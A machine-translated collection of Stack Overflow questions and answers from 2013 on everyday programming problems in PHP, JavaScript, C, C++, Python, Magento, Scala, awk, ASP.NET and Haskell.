“tableB”：工作 ID（主键）工作（与工作中的行 ID 相关）摘要描述日期

“tableC”：时间 id（主键）工作（与工作中的行 id 相关）开始结束

期望的输出：我不太确定哪种格式最好。我想要一个工作行，有一份工作清单，还有一份工作时间清单。

嵌套循环示例： $work 是一个包含两个值的数组。第一个是作品数组，第二个是时间数组。

```
foreach ($work[0] as $workk=>$workv) {
    echo("<div><h1>" . $workk . ": " . $workv["summary"] . "</h1><br/>Job: " . $workv["job"] . "</br>Date: " . $workv["date"] . "<br>Description:" . $workv["description"] . "<br/>Times:<br/>");
    foreach ($work[1] as $workid=>$times) {
        if ($workid == $workk) {
            foreach ($times as $time) {
                echo("Start: " . $time[0] . " | End: " . $time[1]);
            }
            break;
        }
    }
} 
```

我在函数中使用此代码获取“工作”数组（其中 $query->result() 是长 JOIN 查询中的一行）

```
foreach ($query->result() as $row) {
                if (!array_key_exists($row->id, $work)) {
                    $work[$row->id] = array("job"=>$row->job, "summary"=>$row->summary, "description"=>$row->description, "date"=>$row->date);
                }
                $times[$row->id][] = array($row->start, $row->end);
            }
            return array($work, $times); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:23:54.377

您有两种查询数据库的方法：

1.  使用两个左连接获取所有数据。
2.  获取主数据并按需加载详细信息。

**不要分别加载所有三个表，然后尝试在 php 中链接它们*

第一种方法一开始可能需要更长的时间来加载，但随着数据的加载，将不再有数据库调用。另一方面，尽管将数据显示为表格（具有重复的主数据）可能很容易，但这通常不是所需的 UI。除非您使用特殊的 UI 组件来自动处理主详细信息，否则您可能难以将表格转换为更合理的形式（在这种情况下是您的循环）。

您的问题实际上是一个 UI 设计问题，即如何显示两个级别的主细节。有许多 UI 模式可以显示主细节。

例如，您只能在下拉列表中加载第一级（表 A）并查询数据库并在下拉更改时显示第二级。或者你可以有一个树状结构，在折叠时查询数据库。

看看[这个链接](http://download.oracle.com/tech/blaf/specs/masterdetail_template.html)，以获得一些想法。您还可以尝试搜索 php 的主从 UI 组件。

# ajax - 设置 Breeze JS ajax 适配器以发送查询字符串参数而不是标题

> ID：16204812
> 
> 赞同：0
> 
> 时间：2013-04-25T01:09:23.853
> 
> 标签：ajax, jquery, http-headers, query-string, breeze

是否可以设置 Breeze JS ajax 适配器来发送额外的查询字符串参数？现在我正在使用自定义标头参数，但想将我们的应用程序更改为使用查询字符串参数。

当前代码：

```
 function configureAjaxAdapter() {
        var ajaxAdapter = breeze.config.getAdapterInstance("ajax");
        ajaxAdapter.defaultSettings = {
            beforeSend: function(xhr, settings) {
                xhr.setRequestHeader("db", config.db);
                xhr.setRequestHeader("login", config.login);
            }
        }; 
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:33:28.917

看一下 EntityQuery.withParameters 方法。这是在查询中传递查询字符串参数的“首选”（和安全）机制。例如：

```
var params = {
   db: config.db,
   login: config.login
};

var q = EntityQuery.from("Foos").withParameters(params);
myEntityManager.executeQuery(q).then(...) 
```

# c - getchar() 没有按应有的方式行事？

> ID：16204813
> 
> 赞同：1
> 
> 时间：2013-04-25T01:09:25.607
> 
> 标签：c, windows, getchar

所以，我在 Visual Studio 2012 Ultimate 中使用 getchar 得到了一些奇怪的结果。这是我能想出的最简单的例子，它表明它不是代码错误，而是其他东西在起作用。

```
#include <cstdio>

int main(int argc, char* argv[]) {
    char c = getchar();
    putchar(c);
    return 0;
} 
```

然而，结果出来（视觉上）有点像 iostream 库中的“cin”。getchar 按原样返回一个字符（第一个字符），但是当我按下键时，它会在屏幕上显示字符，并且在我按 Enter 之前不会返回。我搜索了一下，并没有真正找到任何其他发生这种情况的案例，有没有人知道这里发生了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:19:19.433

输入是行缓冲的，因此`getchar`只有在至少输入一行输入时才会采用一个字符。如果你不结束这一行，而是`^D`在 Linux 上关闭输入，我猜`^Z`在 Windows 上，那么你会看到它也会打印第一个字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:21:12.737

标准输入通常是行缓冲的。这意味着系统将在您在输入缓冲区中键入字符时读取并存储字符，直到您输入一整行文本。该`getchar()`函数从该输入缓冲区中读取字符。

对于大多数目的，一次读取一整行输入更有意义，然后在您阅读后处理该行。

有一些方法可以一次立即输入一个字符，但它们是系统特定的（而且有点难看）。[comp.lang.c FAQ](http://www.c-faq.com/)中的问题 19.1讨论了这一点。

# python - 使用 Python 脚本输出字符串？

> ID：16204815
> 
> 赞同：0
> 
> 时间：2013-04-25T01:09:32.790
> 
> 标签：python, authentication, output

我一直在用 Python 编写一个简单的程序，它可以作为一种用于破解密码的简单程序（这只是为了在学校里玩，不要以为我在尝试破解或任何东西）。我遇到的问题是我不知道如何根据需要制作 Python 输出......目前我只有它打印它生成的值。

是否有可能让 python 输出一个它生成的变量或字符串以作为用户或其他东西登录？或者，从纯粹尝试登录退后一步，Python 有没有办法将在脚本中生成的字符串输出到不同的源（例如，将从 Python 脚本生成的字符串输出到Web 浏览器的地址栏）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:24:23.850

看起来你几乎可以用 python 做任何事情，这个例子在你的默认浏览器中打开 www.google.com：

```
import os

webString = "http://www.google.com/"
os.system("open "+webString) 
```

`os.system(someString)`您可以像在终端中一样运行任何命令（someString）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T01:18:20.537

打印文本最常用的方法是使用“打印”功能。repr 提供值的内部表示，这样您可以确定该值是否为字符串（使用 repr 会产生 '...' 而不是 ...）。

```
my_string = "hello"
print(my_string)

next_string = "there"
print(repr(next_string)) 
```

生产

```
>>> 
hello
'there' 
```

另一个例子是这个

```
import string

for i,letter in enumerate(string.ascii_lowercase,1):
    print(str(i)+" : "+letter) 
```

它输出字母表中的字母及其索引。

IE

```
>>> 
1 : a
2 : b
3 : c 
```

如您所见， print 允许您输出变量的值（它不仅适用于字符串！）。这些变量可以在运行时分配它们的值，因此您可以动态打印内容。

如果你想创建一个单独的日志文件：

```
def getLog():
    return "yadayadaydada"

log = getLog()

with open('f.txt','a+') as f:
    f.write(log) 
```

将创建一个名为“f.txt”的外部文本文件并将提供的值附加到 f.write（在您可能进行的任何调用中），在这种情况下会产生：

```
yadayadaydada 
```

# magento - 致命错误：在第 463 行的 mysite/app/code/core/Mage/Adminhtml/Block/System/Config/Form.php 中的非对象上调用成员函数 toOptionArray()

> ID：16204816
> 
> 赞同：2
> 
> 时间：2013-04-25T01:09:37.217
> 
> 标签：magento

您好，我正在使用 magento 1.7.0.2，如果我在进行配置时尝试安装扩展程序（个人栏），则会出现以下错误：

致命错误：在第 463 行的 app/code/core/Mage/Adminhtml/Block/System/Config/Form.php 中的非对象上调用成员函数 toOptionArray()

第 463 行：$optionArray = $sourceModel->toOptionArray($fieldType == 'multiselect');

你能帮帮我吗？

```
 $sourceModel = Mage::getSingleton($factoryName);
                if ($sourceModel instanceof Varien_Object) {
                    $sourceModel->setPath($path);
                }
                if ($method) {
                    if ($fieldType == 'multiselect') {
                        $optionArray = $sourceModel->$method();
                    } else {
                        $optionArray = array();
                        foreach ($sourceModel->$method() as $value => $label) {
                            $optionArray[] = array('label' => $label, 'value' => $value);
                        }
                    }
                } else {
                    $optionArray = $sourceModel->toOptionArray($fieldType == 'multiselect');
                }
                $field->setValues($optionArray);
            } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-08-19T14:26:59.803

转到 app\code\core\Mage\Adminhtml\Block\System\Config\Form.php

在第 463 行找到以下内容

```
$optionArray = $sourceModel->toOptionArray($fieldType == ‘multiselect’); 
```

并将其替换为：

```
if(is_object($sourceModel)){
$optionArray = $sourceModel->toOptionArray($fieldType == ‘multiselect’);
} else {
Mage::log($e->source_model);
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T06:37:48.380

当源模型现在为某些属性定义时，它是可能的。请检查 eav_attribute 表 source_model 字段。某些条目可能错误或丢失。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T07:39:08.563

在 system.xml 配置文件
`select/multiselect`
`modulename/namespace_module_model_somemodelname`中。
然后创建 namespace_module_model_somemodulename 文件.. 在你自己的模型中写这个 toOptionArray() 方法（即）类似这样的东西..
例如： public function toOptionArray()
{ return array( array('value' => 1, 'label'=>Mage ::helper('newmodule')-> **('Yes')), array('value' => 0, 'label'=>Mage::helper('newmodule')->** ('No')), ) ; } 假设 modulename->adminhtml/Mage_Adminhtml_Model_System_Config 创建这个函数。那么你不应该得到错误......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-06-09T11:52:12.940

就我而言，我通过以下步骤解决了它：-

1.  **禁用编译**( `System -> Tools -> Compilation`)
2.  **刷新缓存**( `System -> Cache Management`)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-10-19T09:00:34.557

我在主题上遇到了同样的问题，因为后端的菜单没有唯一命名。在我的例子中，“Magento Theme Bearstore”有菜单项“themeoptions”，但在德国 Magento 的 m2e 模块中已经存在一个名为“themeoptions”的菜单！

因此，请检查哪个工厂名称有冲突。就我而言，我将所有“themeoptions”（还有模块名称等）重命名为“bearstoreoptions”（在匹配情况下要小心）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-25T06:37:43.647

检查您的文件权限，是否正确安装了扩展并且所有文件都在服务器上，以及是否存在给出此错误的配置字段的 backend_model

# php - 超薄框架：干

> ID：16204822
> 
> 赞同：0
> 
> 时间：2013-04-25T01:09:58.880
> 
> 标签：php, frameworks, slim

我正在使用以下代码来使用路线，但我会为不同的路线重复相同的代码。

问题：避免重复的最佳方法是什么？我尝试过使用 getParameters 方法，但这不起作用，因为当我返回参数时，我需要将它们设置为一个变量，这使得代码变得多余。或者，也许我看错了。

我正在尝试使用“DRY”（不要重复自己）。有人可能会更改参数名称，所以这很有帮助。

```
$app->get( '/blog', function() use ($app){ //same code as below });

$app->get( '/link', function() use ($app){
$link = new linksApi();

//call question api

$username = $app->request()->params('username');
$company = $app->request()->params('company'); // tags
$follower = $app->request()->params('follower');    
$max = $app->request()->params('max');    
$date = $app->request()->params('date');    
$date_value = $app->request()->params('date_value');    
$oldest = $app->request()->params('oldest');    
$counts = $app->request()->params('counts');    
$sorts = $app->request()->params('sorts');    
$counts = $app->request()->params('counts');    
$format = $app->request()->params('format');    

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-30T11:13:04.893

如果您担心性能，则使用它是不明智的，但是在这里：

```
$routes = array(
    'username',
    'company',
    'follower',
    'max'
    // ...
);

foreach($routes as $r) {
    ${$r} = $app->request()->params($r);
} 
```

# actionscript-3 - 如何在 AS3 中将输入文本字段中的 $ 和 , 转换为变量？

> ID：16204827
> 
> 赞同：0
> 
> 时间：2013-04-25T01:10:36.840
> 
> 标签：actionscript-3, actionscript, casting, textfield

我基本上有一个接受来自文本字段的输入的函数。文本字段中允许的字符包括逗号和美元符号。所以，我的问题是，如果包含美元符号或逗号，我如何将输入值转换为数字？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:33:20.050

如果您使用的是 Flex，您可以使用 CurrencyFormatter：

```
<s:CurrencyFormatter id="currencyFormatter" 
    currencySymbol="$"                           
    decimalSeparator="," 
    groupingSeparator="."
    useCurrencySymbol="true"/>

// in your function:
var number:Number = currencyFormatter.parse(text).value; 
```

如果您不使用 Flex 或者需要更多灵活性，则可以使用 parseFloat 和正则表达式来删除美元符号并用逗号替换点：

```
text = text.replace(/\$/g, '').replace(/,/g, '.');
var number:Number = parseFloat(text); 
```

# c++ - 为什么可以在 C++ 中编写类似 string s = "xxx" 的表达式？

> ID：16204828
> 
> 赞同：3
> 
> 时间：2013-04-25T01:10:41.110
> 
> 标签：c++, string, implicit-conversion

我经常看到：

```
string str = "123"; 
```

我的问题是如果`string`是类类型，为什么我们可以直接将其设置为等于`"123"`而不是使用`new`或直接初始化它？

我习惯于看到类似的东西

```
classType *pt = new classType;
classType pt = classType(); 
```

不是

```
classType s = value; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-25T01:12:27.410

C++ 字符串类型有一个隐式转换构造函数，它接受作为输入 a `const char *`。因此，使用 C 风格的字符串初始化 C++ 字符串是合法的，因为 C++ 会将其解释为对隐式转换构造函数的调用。

在这种情况下，代码

```
string str = "123"; 
```

相当于

```
string str("123"); 
```

更明确地看起来像构造函数调用。

请注意，很少看到类似的东西

```
classType p = classType(); 
```

更恰当的说法是写

```
classType p; 
```

它隐式调用默认的无参数构造函数。

希望这可以帮助！

# qt - PyQT：禁用鼠标左键单击

> ID：16204832
> 
> 赞同：0
> 
> 时间：2013-04-25T01:11:05.027
> 
> 标签：qt, pyqt, overriding, mouse, mouseevent

有没有办法在 Qt 中禁用（和覆盖）鼠标左键？更好的是，在 PyQt 中。我在我的小部件类中写了这样的东西：

```
def mousePressEvent(self,event): 
    if event.button() == QtCore.Qt.RightButton:
        print "left" 
```

一个也试过这个：

```
 def eventFilter(self, source, event):

        if event.type()==QtCore.QEvent.MouseButtonPress:
            if event.button() == QtCore.Qt.LeftButton:
                print "left"

...
app.installEventFilter(ui) 
```

但这只有在我单击左键不执行任何操作的地方时才会执行，例如在表单背景上。当我单击按钮时，鼠标左键行为正常并且不打印“左”。我错过了什么？提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T10:00:45.423

这对我有用：

```
# coding: utf-8
import sys

from PyQt4 import QtCore, QtGui

class MyDialog(QtGui.QDialog):
    def __init__(self, parent=None):
        super(MyDialog, self).__init__(parent)

        self.button1 = QtGui.QPushButton("Button 1")
        self.button2 = QtGui.QPushButton("Button 2")

        hbox = QtGui.QHBoxLayout()
        hbox.addWidget(self.button1)
        hbox.addWidget(self.button2)
        self.setLayout(hbox)

        self.button1.clicked.connect(self.on_button_clicked)
        self.button2.clicked.connect(self.on_button_clicked)

        self.button1.installEventFilter(self)

    def eventFilter(self, obj, event):
        if event.type() in (QtCore.QEvent.MouseButtonPress,
                            QtCore.QEvent.MouseButtonDblClick):
            if event.button() == QtCore.Qt.LeftButton:
                print "left"
                return True
        return super(MyDialog, self).eventFilter(obj, event)

    def on_button_clicked(self):
        print('on_button_clicked')

if __name__ == '__main__':
    app = QtGui.QApplication(sys.argv)
    w = MyDialog()
    w.show()
    sys.exit(app.exec_()) 
```

# xcode - Mac OS X 用户配置文件文件夹？

> ID：16204837
> 
> 赞同：0
> 
> 时间：2013-04-25T01:11:59.523
> 
> 标签：xcode, macos, global-variables, environment-variables, user-profile

有人知道 MAC OS X 中的默认环境变量吗？用户文件夹的变量是什么？

例如，如果 MAC OS X 中的路径是“ **/Users/someuser/Applications** ”，那么“ **someuser** ”的变量是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T01:13:31.480

就像在其他 Unix 系统上一样，它是`$USER`和`$LOGNAME`. 并且`$HOME`是主目录的路径`/Users/someuser`。

# javascript - 与 JavaScript 中的 null - !== vs != 进行比较

> ID：16204840
> 
> 赞同：31
> 
> 时间：2013-04-25T01:12:24.030
> 
> 标签：javascript, compare

好的，所以我在处理我的 node.js 应用程序时在我的 Sublime 编辑器上安装了 Linter。它捕获的一件事是我应该始终使用 !== 将对象与 null 进行比较（我通常使用 != ）。

所以我改变了它......但后来我注意到 !== 不起作用。

我有这种情况：

```
var x = null;
if (x !== null)
    console.log('x is not equal to null'); 
```

当我使用 !== 时，控制台会打印该行，即使它显然不是真的。当我将其切换回 != 时，它表现正常。

所以我的问题是，为什么 linter 告诉我使用 !== 如果它不符合我的要求...

我知道我错过了一些东西。

* * *

**更新** 好的，所以它可能比我最初想象的要复杂一些。在我的真实代码中，我使用 !== 和 node.js GLOBAL 对象。

```
console.log('Global User: ' + GLOBAL.User);

if (GLOBAL.User != null)
{
    console.log('User is not null');
} 
```

即使 GLOBAL.User 为空，控制台行也会打印...

也许这个物体很特别？

* * *

* * *

**更新 2**

好的，所以在阅读了评论并查看了我的代码之后，我了解到 !== 如果对象未定义而不是 null 可能会出现问题（请参阅这篇文章：[为什么 null 是一个对象以及 null 和未定义之间的区别?](https://stackoverflow.com/questions/801032/why-is-null-an-object-and-whats-the-difference-compared-to-undefined?lq=1) )。

因此，在我的情况下，我的全局变量可能是未定义的、空的或充满数据的，具体取决于何时调用此方法。我将返回并更新我的代码，使其永远不会未定义，然后 !== 将始终如一地工作。

谢谢您的帮助！

* * *

谢谢，大卫

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-04-25T01:29:28.197

你`global.User`的是`undefined`，不是`null`。使用`==`它们时，它们的计算结果相等，但`===`您要比较的项目必须是相同的类型。`undefined`有类型`undefined`，`null`有类型`object`。

`undefined`并且`null`非常相似，但它们通常意味着两个非常不同的东西。通常`undefined`是当某物没有分配值时的结果，而`null`有一个值，并且该值被显式设置为“无”。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-04-25T01:20:31.783

在 JavaScript 中唯一不等于自身的值是`NaN`. 如果`null === null`是`false`，那么你的 JavaScript 引擎有严重的问题；）

为确保条件语句写得好，请始终使用大括号。

```
var x = null;
if (x !== null) {
    console.log('x is not equal to null');
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-03-30T14:23:46.657

它更简单

```
var x = null;
    if (x) 6 
    if (!x) 7 
```

结果是

```
undefined
7 
```

# scala - scala - Haskell 序列的模拟

> ID：16204842
> 
> 赞同：5
> 
> 时间：2013-04-25T01:12:29.140
> 
> 标签：scala, haskell, monads

Haskell`sequence`函数的scala模拟是什么？ [http://hackage.haskell.org/packages/archive/base/latest/doc/html/Prelude.html#v:sequence](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Prelude.html#v:sequence)

`sequence`在 Haskell 中定义如下：

```
sequence :: Monad m => [m a] -> m [a]
sequence ms = foldr k (return []) ms
            where
              k m m' = do { x <- m; xs <- m'; return (x:xs) } 
```

这里有一些用途：

```
ghci> sequence [Just 1, Just 2, Nothing, Just 3]
Nothing
ghci> sequence [[1,2],[3,4],[5,6]]
[[1,3,5],[1,3,6],[1,4,5],[1,4,6],[2,3,5],[2,3,6],[2,4,5],[2,4,6]] 
```

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T05:44:20.847

如果你不想使用scalaz，那么你可以自己实现

```
def map2[A,B,C](a: Option[A], b: Option[B])(f: (A,B) => C): Option[C] =
  a.flatMap { x => b.map { y => f(x, y) } }

def sequence[A](a: List[Option[A]]): Option[List[A]] =
  a.foldRight[Option[List[A]]](Some(Nil))((x,y) => map2(x,y)(_ :: _)) 
```

或者带有遍历的替代实现

```
def traverse[A, B](a: List[A])(f: A => Option[B]): Option[List[B]] =
  a.foldRight[Option[List[B]]](Some(Nil))((h,t) => map2(f(h),t)(_ :: _))

def sequence[A](seq: List[Option[A]]): Option[List[A]] = traverse(seq)(identity) 
```

# cocoa-touch - UITableViewCell 阴影未为某些单元格绘制

> ID：16204843
> 
> 赞同：0
> 
> 时间：2013-04-25T01:12:33.453
> 
> 标签：cocoa-touch, uitableview, core-animation

我有一个自定义的 tableview 单元子类，它绘制了一个阴影...... ![浏览量首次加载](https://i.stack.imgur.com/WymER.jpg)

当我向下滚动时，一些单元格没有绘制阴影......

![在此处输入图像描述](https://i.stack.imgur.com/5WzoC.jpg)

当我向上滚动时也会发生这种情况。

我尝试将绘图代码移动到单元格子类 drawRect、setNeedsLayout。我也在 tableviewController 的配置单元格方法中尝试过这个。

```
self.layer.shadowRadius = 4.1f;
self.layer.shadowOpacity = 0.5;
self.layer.shadowOffset = CGSizeMake(2.1f,7.4f);

CGFloat curlFactor = 15.00f;
CGFloat shadowDepth = 4.6f;
CGSize size = self.layer.bounds.size;

UIBezierPath* path = [UIBezierPath bezierPath];

[path moveToPoint:CGPointMake(0.0f, 0.0f)];
[path addLineToPoint:CGPointMake(size.width, 0.0f)];
[path addLineToPoint:CGPointMake(size.width, size.height + shadowDepth)];

[path addCurveToPoint:CGPointMake(0.0f, size.height + shadowDepth)
        controlPoint1:CGPointMake(size.width - curlFactor, size.height + shadowDepth - curlFactor)
        controlPoint2:CGPointMake(curlFactor, size.height + shadowDepth - curlFactor)];
[self.layer setShadowPath:[path CGPath]]; 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T03:20:46.380

It looks like you are drawing shadows out of bounds of each UITableViewCell view, when UITableView is reusing cells and displaying them, it may not keep all cell subviews stacked over each other perfectly and you need to ensure them yourself.

in UITableView delegate

```
- (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath
{
    static int index = -1;
    if (indexPath.row > index) {
        [tableView sendSubviewToBack:cell];
    }
    else {
        [tableView bringSubviewToFront:cell];
    }
    index = indexPath.row;
} 
```

or you can implment inner shadow and avoid drawing outside of bounds.

# shell - 如何检查字段是否包含圆括号？

> ID：16204844
> 
> 赞同：0
> 
> 时间：2013-04-25T01:12:57.117
> 
> 标签：shell, unix, awk

我有一个非常大的平面文件列表，我已经能够用 awk 的新手知识对其进行解析，但是当我的字段没有被空格分隔并且不太统一时，我遇到了一些学习曲线。我的样本数据如下：

```
AAA 10(05/12)(06:59) BBB
CCC 12       (12:24) DDD
EEE 10 04:39 (02:10) FFF
GGG 13 12/09  03:52  HHH 
```

我想解析第三列中的字段，但前提是它们不是空白也不是被括号包围。所以我应该有 4 行的输出，2 个空白和 2 个填充数据：

```
*blank*
*blank*
04:39
12/09 
```

到目前为止，我尝试过的是：

```
my loop:
dtime=substr($0,7,7)
if (match(dtime,"(\\(.*\\))")==1) {
    dtime=""
}
print dtime 
```

有没有更有效的方法来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:37:53.163

尝试 gawk[`FIELDWIDTHS`](http://www.gnu.org/software/gawk/manual/gawk.html#Constant-Size)变量：

```
# AAA 10(05/12)(06:59) BBB
# .3.1.21.5...11..5..11.3.
$ gawk -vFIELDWIDTHS='3 1 2 1 5 1 1 5 1 1 3' '{if($4=="(" && $6==")")print ""; else print $5}' input 

04:39
12/09 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:38:00.217

使用 sed：

```
sed -e 's/[^ ]* *[^( ]*//'                          \
    -e 's/[(]*[0-9][0-9]:[0-9][0-9][)]* *...$//'    \
    -e 's/(.*)//' input 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T09:35:05.347

这可能会为您解决问题：

```
$ awk 'NF==5{print $3;next}{print "*blank*"}' file
*blank*
*blank*
04:39
12/09 
```

# c# - 登录在子域上无限重定向

> ID：16204845
> 
> 赞同：0
> 
> 时间：2013-04-25T01:13:07.387
> 
> 标签：c#, asp.net

我有一个子域：kezblu.mysite.com。

它实际上位于 mysite.com/kezblu

我有代码会要求用户登录，如果他们不是：

```
protected void HandleLoginRedirect()
{
    if (IsRequestedPage("Login") && Authorization.IsAuthenticated())
    {
        Response.Redirect("default.aspx");
    }
    else if (!Authorization.IsAuthenticated() && !IsRequestedPage("Login"))
    {
        string fileName = this.Page.Request.Url.ToString();
        fileName = fileName.Remove(0, fileName.LastIndexOf("/") + 1);

        Response.Redirect("Login.aspx?redirect=" + fileName);
    }
}

    public bool IsRequestedPage(string pageName)
    {
        return Request.RawUrl.StartsWith("/" + pageName + ".aspx");
    } 
```

问题是我去 kezblu.mysite.com/kezblu

我最终得到：

```
http://kezblu.mysite.com/kezblu/Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=Login.aspx?redirect=default.aspx 
```

我在退出时也注意到了，即使我在 kezblu.mysite.com/somewhere.aspx

它将我重定向到上述内容。

我的代码有什么问题？

我不明白。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:51:12.607

您需要设置身份验证 cookie 的域，以便它也适用于您的子域。

当您请求子域中的页面时，如果您未通过身份验证，它会将您重定向到您域中的登录页面。您进行身份验证，服务器发送一个仅用于域的身份验证 cookie；不是子域。然后，您将被重定向回您来自子域的页面，但您的浏览器不会发送身份验证 cookie。这会导致您的子域页面再次重定向回登录页面。这一次，您的浏览器确实发送了 cookie，登录页面会自动将您重定向回来，但您的浏览器不会发送 cookie，因此循环开始。

要解决此问题，请将 cookie 的域设置为`".domain.com"`而不是`"domain.com"`：

```
<authentication mode="Forms">
  <forms loginUrl="..."
    domain=".domain.com" /><!-- Not "domain.com" -->
</authentication> 
```

# jquery - 使用 URL 查询将 Select List 值设置为 Selected

> ID：16204847
> 
> 赞同：0
> 
> 时间：2013-04-25T01:13:33.897
> 
> 标签：jquery, drop-down-menu

我有一个包含几个选择列表的页面。在用户做出选择并单击按钮后，我会将所选选项和值添加到包含相同选择列表的不同页面的 url。

我想使用查询通过循环查询并设置相应选择列表的值来选择新页面上的适当值，以便新页面上的列表反映它们刚刚来自的页面。

这是一个用于测试的代表性查询字符串； [http://website.com/sign-up/?tf-from-country=乌拉圭&tf-to-country=加拿大](http://website.com/sign-up/?tf-from-country=Uruguay&tf-to-country=Canada)

这是 6 小时的研究失败了，但我不知道为什么。

```
 if ( window.location.search ) {
//console.log( window.location.search.substr(1).split('&') );

    var qs = window.location.search.substr(1).split('&');

    for (var i=0; i< qs.length; i++){
        var param = qs[i].split('=');
        // console.log('setting field', param[0], 'to', param[1]);
        //$('.' + param[0]).addClass('foundit');
            // select list set to param
            var element = '.' + param[0];
            $(element).val(param[1]).attr("selected", true);
            //console.log(element);
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:59:30.400

要获取 URL 中的变量，请使用以下函数：

```
function getUrlVars()
{
    var vars = [], hash;
    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
    for(var i = 0; i < hashes.length; i++)
    {
        hash = hashes[i].split('=');
        vars.push(hash[0]);
        vars[hash[0]] = hash[1];
    }
    return vars;
} 
```

这将返回一个包含所有变量的关联数组。

# php - Javascript 中的对象可以表现得像 PHP 中的 ArrayAccess / ArrayObject 吗？

> ID：16204855
> 
> 赞同：2
> 
> 时间：2013-04-25T01:15:33.813
> 
> 标签：php, javascript

在 PHP 中，一个类可以实现 ArrayAccess 接口，因此可以像这样实例化和访问该类：

```
class MyClass implements ArrayAccess {
  protected $data = array();
  public function offsetGet($offset) {
    return isset($this->data[$offset]) ? $data[$offset] : null;
  }
  public function offsetSet($offset, $value) {
    $this->data[$offset] = $value;
  }
  public function __toString()
  {
    return print_r($this->data);
  }
}

$a = new MyClass;
$a['item'] = 10;
$a['item2'] = 'adsf';
echo $a;
// Outputs Array( 'item' => 10, 'item2' => 'adsf' ) 
```

Javascript中有这样的东西吗？我希望能够在 Javascript 中创建一个迭代器类，但是可以通过使用括号表示法而不是使用`get('item')`/来访问这些项目，`set('item2', 'asdf')`因此它可以像数组而不是对象一样工作，但仍然具有我的构造函数中的所有函数（ next、prev、is、reset 等）

我问这个是因为 AngularJS 在使用`angular.element()`时会返回一个对象（？），就像`Object [div.id1]`在 firebug 控制台中一样

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:44:39.357

答案是肯定的，但不是在任何打算供公众使用的应用程序中。

ECMAScript 5 支持 'get' 和 'set' 声明（在已知属性上），并且在未来的修订版中将支持代理（它可以侦听对对象的任何更改），但是如果您的应用程序将支持 IE 任何东西或任何设备在用户不选择下载开发者浏览器并启用开发切换的情况下，您将不得不让很多用户落后几年（考虑智能手机的合同期限，而移动浏览器仍然没有） t 那里），或者实现旧版本并在 try-catch 子句中测试兼容性，因为使用这些功能否则可能会导致硬异常，或者只是不起作用，具体取决于。

因此，是的，但无论如何，您都必须以旧方式进行操作。

# haskell - Project Euler：在 Haskell 实现中排名第一

> ID：16204862
> 
> 赞同：2
> 
> 时间：2013-04-25T01:16:16.813
> 
> 标签：haskell

对于 Project Euler 问题 #1，GHCI 中最短的单行代码是：

```
sum [3,6..9999] + sum [5,10..9999] - sum [15,30..9999] 
```

解决问题后我发现这是一个非常血腥的方式。但是，由于我是 Haskell 的新手，我决定看看我是否可以把它放在一起作为一组函数返回类似的答案 x 的任何值（步长值，即上面的 '3' 或 '5'] 和y（列表的长度）。

我在这里完成了第一个功能：

```
sumList :: (Enum a, Num a) => a -> a -> a
sumList a b = sum[a,a+a..b] 
```

接下来我试图利用这个功能并做一些事情`sumListTotals [3,5] 1000`，例如从问题中。这将全部`sumList`用于列表中的每个项目，然后减去重复的数字（即 [15,30..1000] 使用示例。

我不是在寻找真正解决它的人，而是帮助我指出正确的方向。

我试图使用如下`map`功能：

```
sumListTotals list = map f list
    where f = sumlist a b 
```

但是，我不确定如何从列表中取出这些东西，或者我是否做了类似的事情，`sumListTotals ([3,5],1000)`或者我完全走错了路？

根据@user5402 更新：

```
module Project1 where

import Data.List (union)

sumListTotals :: (Enum a, Eq a, Num a) => a -> a -> a -> a
sumListTotals a b c = sum $ union [a,(*2)a..c] [b,(*2)b..c] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:57:04.610

你在正确的轨道上：

```
sumListTotals a b c = sum [a,a+a..c] + sum [b,b+b..c] - sum[m,m+m..c]
  where m = ...???... 
```

我会让你弄清楚它的定义，`m`因为这实际上是一个数论问题，而不是一个 Haskell 编程问题。

显然`a = 3, b = 5` `m`应该是`15`。但是应该`m`是为了`a = 3, b = 3`什么？

